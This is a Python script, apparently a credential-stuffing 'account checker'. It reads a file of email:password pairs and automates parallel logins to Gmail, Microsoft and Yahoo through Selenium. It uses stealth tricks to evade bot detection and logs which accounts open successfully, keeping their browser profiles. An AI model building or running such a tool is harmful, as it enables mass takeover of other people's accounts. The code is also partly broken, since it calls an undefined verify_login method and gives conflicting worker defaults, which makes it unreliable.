import time
import os
import re
import json
import csv
from datetime import datetime
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

class EmailLoginValidator:
    def __init__(self, headless=False, max_workers=5):
        self.headless = headless
        self.max_workers = max_workers  # Number of parallel logins (5 at a time)
        self.results = []
        self.results_lock = Lock()  # Thread-safe results list
        self.logs_dir = Path("email_login_logs")
        self.logs_dir.mkdir(exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    def detect_email_provider(self, email):
        """Detect email provider from email address"""
        domain = email.split('@')[1].lower()

        if 'gmail.com' in domain:
            return 'gmail'
        elif 'hotmail.com' in domain or 'outlook.com' in domain or 'live.com' in domain:
            return 'microsoft'
        elif 'yahoo.com' in domain or 'ymail.com' in domain:
            return 'yahoo'
        else:
            return 'custom'

    def get_login_config(self, provider):
        """Get login configuration based on email provider"""
        configs = {
            'gmail': {
                'url': 'https://accounts.google.com/signin',
                'email_xpath': '//input[@type="email"]',
                'password_xpath': '//input[@type="password"]',
                'success_url': 'mail.google.com',
                'wait_time': 20
            },
            'microsoft': {
                'url': 'https://login.microsoftonline.com/',
                'email_xpath': '//input[@type="email"]',
                'password_xpath': '//input[@type="password"]',
                'success_url': 'outlook.live.com',
                'wait_time': 20
            },
            'yahoo': {
                'url': 'https://login.yahoo.com/',
                'email_xpath': '//input[@name="username"]',
                'password_xpath': '//input[@name="password"]',
                'success_url': 'mail.yahoo.com',
                'wait_time': 20
            },
            'custom': {
                'url': None,
                'email_xpath': None,
                'password_xpath': None,
                'success_url': None,
                'wait_time': 15
            }
        }
        return configs.get(provider, configs['custom'])

    def create_chrome_driver(self, profile_name):
        """Create Chrome driver with best settings for Python 3.13"""
        profile_dir = f"/tmp/chrome_profile_{profile_name}"
        os.makedirs(profile_dir, exist_ok=True)

        options = webdriver.ChromeOptions()
        options.add_argument(f"--user-data-dir={profile_dir}")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-plugins")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")

        # Anti-detection
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

        if self.headless:
            options.add_argument("--headless=new")

        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)

        # Execute stealth scripts
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
            "source": """
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                })
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5]
                })
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en']
                })
            """
        })

        return driver, profile_dir

    def attempt_login(self, driver, email, password, config):
        """Attempt login for given email and password"""
        try:
            driver.get(config['url'])
            print(f"   → Page loaded: {config['url']}")
            time.sleep(4)

            # Enter email
            if config['email_xpath']:
                print(f"   → Looking for email field")
                email_field = WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.XPATH, config['email_xpath']))
                )
                email_field.clear()
                email_field.send_keys(email)
                print(f"   ✓ Email entered: {email}")
                time.sleep(2)

                # Try to find and click next button
                try:
                    next_selectors = [
                        (By.XPATH, '//button[contains(text(), "Next")]'),
                        (By.XPATH, '//button[@id="identifierNext"]'),
                        (By.XPATH, '//button[@type="button" and contains(@class, "submit")]'),
                        (By.XPATH, '//div[@role="button" and contains(text(), "Next")]'),
                    ]

                    clicked = False
                    for selector in next_selectors:
                        try:
                            next_btn = WebDriverWait(driver, 5).until(
                                EC.element_to_be_clickable(selector)
                            )
                            next_btn.click()
                            print(f"   ✓ Clicked next button")
                            time.sleep(4)
                            clicked = True
                            break
                        except:
                            continue

                    if not clicked:
                        email_field.send_keys("\n")
                        print(f"   → Pressed Enter (no button found)")
                        time.sleep(4)
                except:
                    email_field.send_keys("\n")
                    time.sleep(4)

            # Wait for password field
            print(f"   → Waiting for password field...")
            if config['password_xpath']:
                password_field = WebDriverWait(driver, 20).until(
                    EC.presence_of_element_located((By.XPATH, config['password_xpath']))
                )
                print(f"   ✓ Password field found")
                time.sleep(1)

                password_field.clear()
                password_field.send_keys(password)
                print(f"   ✓ Password entered")
                time.sleep(2)

                # Try to find and click login button
                try:
                    login_selectors = [
                        (By.XPATH, '//button[contains(text(), "Sign in")]'),
                        (By.XPATH, '//button[contains(text(), "Next")]'),
                        (By.XPATH, '//button[@type="submit"]'),
                        (By.XPATH, '//div[@role="button" and contains(text(), "Sign in")]'),
                    ]

                    clicked = False
                    for selector in login_selectors:
                        try:
                            login_btn = WebDriverWait(driver, 5).until(
                                EC.element_to_be_clickable(selector)
                            )
                            login_btn.click()
                            print(f"   ✓ Clicked login button")
                            time.sleep(5)
                            clicked = True
                            break
                        except:
                            continue

                    if not clicked:
                        password_field.send_keys("\n")
                        print(f"   → Pressed Enter (no button found)")
                        time.sleep(5)
                except:
                    password_field.send_keys("\n")
                    time.sleep(5)

            return True

        except Exception as e:
            print(f"   ✗ Login attempt error: {str(e)}")
            return False



    def validate_credentials(self, email, password, provider):
        """Validate credentials for a single account"""
        clean_email = re.sub(r'[^a-zA-Z0-9]', '_', email.split('@')[0])
        profile_name = f"profile_{clean_email}_{int(time.time())}"

        driver = None
        try:
            print(f"\n📧 Testing: {email} ({provider.upper()})")
            print(f"{'─'*50}")

            config = self.get_login_config(provider)

            if provider == 'custom':
                domain = email.split('@')[1]
                config['url'] = f"https://mail.{domain}"

            driver, profile_dir = self.create_chrome_driver(profile_name)
            initial_url = driver.current_url

            if self.attempt_login(driver, email, password, config):
                if self.verify_login(driver, config, initial_url):
                    print(f"\n   ✓✓✓ LOGIN SUCCESSFUL ✓✓✓")
                    result = {
                        'email': email,
                        'status': 'SUCCESS',
                        'provider': provider,
                        'timestamp': datetime.now().isoformat(),
                        'profile': profile_dir
                    }
                    with self.results_lock:
                        self.results.append(result)
                    return True
                else:
                    print(f"\n   ✗ Login verification failed")
                    result = {
                        'email': email,
                        'status': 'FAILED',
                        'provider': provider,
                        'reason': 'Verification failed',
                        'timestamp': datetime.now().isoformat()
                    }
                    with self.results_lock:
                        self.results.append(result)
                    return False
            else:
                print(f"\n   ✗ Login attempt failed")
                result = {
                    'email': email,
                    'status': 'FAILED',
                    'provider': provider,
                    'reason': 'Login attempt error',
                    'timestamp': datetime.now().isoformat()
                }
                with self.results_lock:
                    self.results.append(result)
                return False

        except Exception as e:
            print(f"   ✗ Error: {str(e)}")
            result = {
                'email': email,
                'status': 'ERROR',
                'provider': provider,
                'reason': str(e),
                'timestamp': datetime.now().isoformat()
            }
            with self.results_lock:
                self.results.append(result)
            return False

        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    def process_credentials_file(self, file_path):
        """Process credentials file and validate all accounts in parallel"""
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()

            print(f"\n{'='*60}")
            print(f"EMAIL CREDENTIAL VALIDATOR - PARALLEL MODE")
            print(f"{'='*60}")
            print(f"Max parallel logins: {self.max_workers}")
            valid_lines = [l for l in lines if l.strip() and ':' in l]
            print(f"Found {len(valid_lines)} credentials to test\n")

            # Prepare tasks
            tasks = []
            for i, line in enumerate(lines, 1):
                line = line.strip()
                if not line or ':' not in line:
                    continue

                email, password = line.split(':', 1)
                email = email.strip().lower()
                password = password.strip()

                if '@' not in email:
                    print(f"Line {i}: Invalid email format - {email}")
                    continue

                provider = self.detect_email_provider(email)
                tasks.append((email, password, provider))

            # Run logins in parallel using ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                # Submit all tasks
                future_to_task = {executor.submit(self.validate_credentials, email, password, provider): (email, provider)
                                 for email, password, provider in tasks}

                # Wait for completion and display progress
                completed = 0
                for future in as_completed(future_to_task):
                    completed += 1
                    email, provider = future_to_task[future]
                    try:
                        future.result()
                    except Exception as e:
                        print(f"Exception for {email}: {str(e)}")
                    print(f"[Progress: {completed}/{len(tasks)}]")

            self.print_summary()
            self.save_results()

        except FileNotFoundError:
            print(f"Error: File '{file_path}' not found")
        except Exception as e:
            print(f"Error processing file: {str(e)}")

    def print_summary(self):
        """Print summary of results"""
        successful = sum(1 for r in self.results if r['status'] == 'SUCCESS')
        failed = sum(1 for r in self.results if r['status'] in ['FAILED', 'ERROR'])

        print(f"\n{'='*60}")
        print(f"VALIDATION SUMMARY")
        print(f"{'='*60}")
        print(f"✓ Successful: {successful}")
        print(f"✗ Failed/Error: {failed}")
        print(f"Total: {len(self.results)}")
        if self.results:
            print(f"Success Rate: {successful/len(self.results)*100:.1f}%")
        print(f"{'='*60}\n")

    def save_results(self):
        """Save results to CSV and JSON files"""
        csv_file = self.logs_dir / f"results_{self.timestamp}.csv"
        json_file = self.logs_dir / f"results_{self.timestamp}.json"

        if self.results:
            with open(csv_file, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
                writer.writeheader()
                writer.writerows(self.results)

        with open(json_file, 'w') as f:
            json.dump(self.results, f, indent=2)

        print(f"Results saved to:")
        print(f"  • {csv_file}")
        print(f"  • {json_file}\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python validator.py <credentials_file> [--headless] [--workers 5]")
        print("\nRequired packages:")
        print("  pip install selenium webdriver-manager")
        print("\nExample:")
        print("  python validator.py credentials.txt")
        print("  python validator.py credentials.txt --headless")
        print("  python validator.py credentials.txt --workers 10")
        sys.exit(1)

    file_path = sys.argv[1]
    headless = "--headless" in sys.argv

    # Get number of workers (default 25)
    workers = 25
    for i, arg in enumerate(sys.argv):
        if arg == "--workers" and i + 1 < len(sys.argv):
            try:
                workers = int(sys.argv[i + 1])
            except:
                workers = 25

    validator = EmailLoginValidator(headless=headless, max_workers=workers)
    validator.process_credentials_file(file_path)
